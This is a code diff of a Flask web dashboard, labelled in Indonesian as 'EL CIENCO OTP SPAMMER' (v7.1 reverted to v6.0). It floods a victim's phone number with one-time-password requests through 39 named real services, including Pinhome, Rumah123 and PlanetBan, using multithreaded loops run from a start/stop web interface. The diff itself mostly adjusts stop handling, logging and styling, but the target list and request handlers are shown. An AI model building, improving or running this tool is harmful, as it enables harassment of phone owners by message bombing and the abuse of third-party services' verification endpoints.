@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
-EL CIENCO - OTP SPAMMER WEB DASHBOARD v7.1
+EL CIENCO - OTP SPAMMER WEB DASHBOARD v6.0
 39 API LENGKAP - Unlimited - No License
-FIX: Semua handler didefinisikan
 Run: python app.py
 Access: http://localhost:5000
 """
@@ -33,7 +32,6 @@ app.secret_key = "EL_CIENCO_2310"
 
 is_running = False
 spam_thread = None
-stop_flag = False
 log_messages = []
 stats = {"total": 0, "success": 0, "failed": 0}
 
@@ -70,7 +68,7 @@ def fmt_plus(p):
 def fmt_phone_only(p):
     return p[2:] if p.startswith('62') else p
 
-# ============ HANDLER 1-15 ============
+# ============ HANDLER 1-15 (TAMBAHAN) ============
 
 def send_pinhome_otp(phone):
     url = "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp"
@@ -189,7 +187,7 @@ def send_holland_otp(phone):
     except:
         return None
 
-# ============ HANDLER 16-39 ============
+# ============ HANDLER 16-39 (DARI SCRIPT ASLI) ============
 
 def send_planetban_otp(phone):
     url = "https://api.planetban.com/website/customer/request-otp"
@@ -524,6 +522,7 @@ def send_ptsp_kemenag_otp(phone):
 
 # ============ ALL 39 TARGETS ============
 TARGETS = [
+    # 15 TAMBAHAN
     {'name': 'Pinhome', 'func': send_pinhome_otp, 'fmt': fmt_nocode},
     {'name': 'Maulagi', 'func': send_maulagi_otp, 'fmt': fmt_08},
     {'name': 'Rumah123', 'func': send_rumah123_otp, 'fmt': lambda p: p},
@@ -538,6 +537,7 @@ TARGETS = [
     {'name': 'Ohsome', 'func': send_ohsome_otp, 'fmt': fmt_phone_only},
     {'name': 'Optik Melawai', 'func': send_optik_otp, 'fmt': lambda p: p},
     {'name': 'Holland Bakery', 'func': send_holland_otp, 'fmt': lambda p: p},
+    # 24 DARI SCRIPT ASLI
     {'name': 'PlanetBan', 'func': send_planetban_otp, 'fmt': fmt_08},
     {'name': 'TuneUp', 'func': send_tuneup_otp, 'fmt': fmt_08},
     {'name': 'HashMicro', 'func': send_hashmicro_otp, 'fmt': fmt_phone_only},
@@ -568,32 +568,21 @@ TARGETS = [
 def log_message(msg, level="info"):
     timestamp = datetime.now().strftime("%H:%M:%S")
     log_messages.append(f"[{timestamp}] {msg}")
-    if len(log_messages) > 500:
+    if len(log_messages) > 200:
         log_messages.pop(0)
 
 def process_target(api, target, idx, total):
-    global stats, stop_flag
+    global stats
     name = api['name']
     phone = api['fmt'](target)
     
-    if stop_flag:
-        return False
-    
     try:
         resp = api['func'](phone)
-        if stop_flag:
-            return False
-            
         if resp is not None and resp.status_code in [200, 201, 202]:
             stats["success"] += 1
             stats["total"] += 1
-            log_message(f"✅ {name}: OTP terkirim (200)", "success")
+            log_message(f"✅ {name}: OTP terkirim", "success")
             return True
-        elif resp is not None and resp.status_code == 429:
-            stats["failed"] += 1
-            stats["total"] += 1
-            log_message(f"⏳ {name}: Rate Limit (429)", "warning")
-            return False
         else:
             stats["failed"] += 1
             stats["total"] += 1
@@ -601,22 +590,20 @@ def process_target(api, target, idx, total):
             log_message(f"❌ {name}: Gagal ({status})", "error")
             return False
     except Exception as e:
-        if not stop_flag:
-            stats["failed"] += 1
-            stats["total"] += 1
-            log_message(f"⚠️ {name}: Error - {str(e)[:30]}", "warning")
+        stats["failed"] += 1
+        stats["total"] += 1
+        log_message(f"⚠️ {name}: Error", "warning")
         return False
 
 def run_spam(targets, threads=5, mode="single"):
-    global is_running, stats, stop_flag
+    global is_running, stats
     stats = {"total": 0, "success": 0, "failed": 0}
-    stop_flag = False
     round_count = 0
     
     log_message(f"🚀 Memulai spam ke {len(targets)} nomor", "success")
     log_message(f"📡 Total API: {len(TARGETS)}", "info")
     
-    while is_running and not stop_flag:
+    while is_running:
         round_count += 1
         if mode == "single" and round_count > 1:
             break
@@ -626,37 +613,28 @@ def run_spam(targets, threads=5, mode="single"):
         with ThreadPoolExecutor(max_workers=threads) as executor:
             futures = []
             for idx, api in enumerate(TARGETS):
-                if stop_flag or not is_running:
+                if not is_running:
                     break
                 futures.append(executor.submit(process_target, api, targets[0], idx+1, len(TARGETS)))
             
             for future in as_completed(futures):
-                if stop_flag or not is_running:
-                    for f in futures:
-                        f.cancel()
+                if not is_running:
                     break
                 try:
                     future.result(timeout=10)
                 except:
                     pass
         
-        if stop_flag or not is_running:
-            break
-        
         if mode == "single":
             break
         
-        if is_running and not stop_flag:
+        if is_running:
             log_message(f"⏳ Istirahat 2 detik...", "info")
-            for _ in range(2):
-                if stop_flag or not is_running:
-                    break
-                time.sleep(1)
+            time.sleep(2)
     
-    is_running = False
     log_message(f"⏹ Selesai. Sukses: {stats['success']}, Gagal: {stats['failed']}", "warning")
 
-# ============ HTML (SAMA SEPERTI SEBELUMNYA) ============
+# ============ HTML ============
 HTML = '''
 <!DOCTYPE html>
 <html lang="id">
@@ -694,7 +672,7 @@ HTML = '''
         .btn-start { background: #00ff41; color: #0a0a0a; }
         .btn-stop { background: #ff0040; color: white; }
         .btn-clear { background: #ffaa00; color: #0a0a0a; }
-        .log-box { background: #050505; border: 1px solid #1a1a1a; height: 350px; overflow-y: auto; padding: 8px; border-radius: 6px; font-size: 0.75em; line-height: 1.5; }
+        .log-box { background: #050505; border: 1px solid #1a1a1a; height: 280px; overflow-y: auto; padding: 8px; border-radius: 6px; font-size: 0.75em; line-height: 1.5; }
         .log-box::-webkit-scrollbar { width: 4px; }
         .log-box::-webkit-scrollbar-track { background: #0a0a0a; }
         .log-box::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 3px; }
@@ -704,14 +682,13 @@ HTML = '''
         .log-warning { color: #ffaa00; }
         .log-info { color: #88ccff; }
         .footer { margin-top: 20px; text-align: center; color: #333; font-size: 0.7em; border-top: 1px solid #1a1a1a; padding-top: 15px; }
-        .status-text { color: #888; font-size: 0.8em; margin-top: 5px; }
         @media (max-width: 700px) { .grid { grid-template-columns: 1fr; } .title { font-size: 1.2em; } .stat-card .num { font-size: 1.3em; } }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <div class="title">☣ EL CIENCO <small>· OTP STORM v7.1</small></div>
+        <div class="title">☣ EL CIENCO <small>· OTP STORM v6.0</small></div>
         <div class="badge stopped" id="statusBadge">● IDLE</div>
     </div>
 
@@ -736,17 +713,16 @@ HTML = '''
                 <button class="btn-stop" id="btnStop" onclick="stopSpam()" disabled>⏹ STOP</button>
                 <button class="btn-clear" onclick="clearLogs()">🗑 CLEAR</button>
             </div>
-            <div class="status-text" id="statusText">Status: Menunggu perintah...</div>
         </div>
         <div class="card">
             <h3>📋 LIVE LOG</h3>
             <div class="log-box" id="logBox">
-                <div class="log-entry log-info">[SISTEM] EL CIENCO v7.1 siap, El Manco.</div>
+                <div class="log-entry log-info">[SISTEM] EL CIENCO v6.0 siap, El Manco.</div>
                 <div class="log-entry log-info">[SISTEM] 39 API siap digunakan</div>
             </div>
         </div>
     </div>
-    <div class="footer">EL CIENCO v7.1 · 39 API · Unlimited · No License</div>
+    <div class="footer">EL CIENCO v6.0 · 39 API · Unlimited · No License</div>
 </div>
 
 <script>
@@ -761,28 +737,23 @@ function addLog(msg, level) {
     div.textContent = '[' + time + '] ' + msg;
     box.appendChild(div);
     box.scrollTop = box.scrollHeight;
-    if (box.children.length > 500) box.removeChild(box.firstChild);
+    if (box.children.length > 300) box.removeChild(box.firstChild);
 }
 
 function updateUI(running) {
     var badge = document.getElementById('statusBadge');
     var startBtn = document.getElementById('btnStart');
     var stopBtn = document.getElementById('btnStop');
-    var statusText = document.getElementById('statusText');
     if (running) {
         badge.className = 'badge running';
         badge.textContent = '● RUNNING';
         startBtn.disabled = true;
         stopBtn.disabled = false;
-        statusText.textContent = 'Status: 🔴 SPAM BERJALAN...';
-        statusText.style.color = '#00ff41';
     } else {
         badge.className = 'badge stopped';
         badge.textContent = '● IDLE';
         startBtn.disabled = false;
         stopBtn.disabled = true;
-        statusText.textContent = 'Status: ⏹ Berhenti';
-        statusText.style.color = '#ff4444';
     }
 }
 
@@ -831,21 +802,13 @@ function startSpam() {
 }
 
 function stopSpam() {
-    var btn = document.getElementById('btnStop');
-    btn.disabled = true;
-    btn.textContent = '⏳ STOPPING...';
-    
     fetch('/api/stop', { method: 'POST' })
     .then(function(res) { return res.json(); })
     .then(function(result) {
         addLog('[SISTEM] ' + result.message, 'warning');
-        btn.disabled = false;
-        btn.textContent = '⏹ STOP';
     })
     .catch(function(e) {
         alert('Gagal stop: ' + e.message);
-        btn.disabled = false;
-        btn.textContent = '⏹ STOP';
     });
 }
 
@@ -864,39 +827,7 @@ function refreshStats() {
     .catch(function(e) {});
 }
 
-function refreshLogs() {
-    fetch('/api/logs')
-    .then(function(res) { return res.json(); })
-    .then(function(data) {
-        if (data.logs && data.logs.length > 0) {
-            var box = document.getElementById('logBox');
-            // Tampilkan 10 log terakhir
-            var logs = data.logs.slice(-10);
-            for (var i = 0; i < logs.length; i++) {
-                var msg = logs[i];
-                var level = 'info';
-                if (msg.includes('✅')) level = 'success';
-                else if (msg.includes('❌')) level = 'error';
-                else if (msg.includes('⚠️') || msg.includes('⏳')) level = 'warning';
-                var div = document.createElement('div');
-                div.className = 'log-entry log-' + level;
-                div.textContent = msg;
-                box.appendChild(div);
-            }
-            if (box.children.length > 500) {
-                while (box.children.length > 300) {
-                    box.removeChild(box.firstChild);
-                }
-            }
-            box.scrollTop = box.scrollHeight;
-        }
-    })
-    .catch(function(e) {});
-}
-
-setInterval(refreshStats, 1000);
-setInterval(refreshLogs, 1000);
-
+setInterval(refreshStats, 2000);
 refreshStats();
 addLog('[SISTEM] Dashboard siap digunakan, El Manco.', 'success');
 </script>
@@ -917,16 +848,9 @@ def api_stats():
         'logs': log_messages[-30:],
     })
 
-@app.route('/api/logs')
-def api_logs():
-    return jsonify({
-        'logs': log_messages,
-        'count': len(log_messages)
-    })
-
 @app.route('/api/start', methods=['POST'])
 def api_start():
-    global is_running, spam_thread, stop_flag
+    global is_running, spam_thread
     if is_running:
         return jsonify({'status': 'error', 'message': 'Spam sudah berjalan'})
     
@@ -950,7 +874,6 @@ def api_start():
     if not valid_targets:
         return jsonify({'status': 'error', 'message': 'Format nomor tidak valid (gunakan 08xx atau +62xx)'})
     
-    stop_flag = False
     is_running = True
     
     def run():
@@ -964,24 +887,17 @@ def api_start():
 
 @app.route('/api/stop', methods=['POST'])
 def api_stop():
-    global is_running, stop_flag
-    if not is_running:
-        return jsonify({'status': 'error', 'message': 'Spam tidak sedang berjalan'})
-    
-    stop_flag = True
+    global is_running
     is_running = False
-    log_message("⏹ Perintah STOP diterima - menghentikan semua thread...", "warning")
-    
+    log_message("⏹ Perintah stop diterima", "warning")
     return jsonify({'status': 'success', 'message': 'Spam dihentikan'})
 
 # ============ MAIN ============
 if __name__ == '__main__':
     print("""
     ╔══════════════════════════════════════════════════════════╗
-    ║  ☣ EL CIENCO - OTP STORM WEB DASHBOARD v7.1            ║
+    ║  ☣ EL CIENCO - OTP STORM WEB DASHBOARD v6.0            ║
     ║  39 API LENGKAP · Unlimited · No License                ║
-    ║  ✅ STOP LANGSUNG BERHENTI                              ║
-    ║  ✅ LOG REAL-TIME PER API                               ║
     ║                                                         ║
     ║  🌐 http://localhost:5000                               ║
     ║  📱 Akses dari HP: http://IP-ANDA:5000                 ║
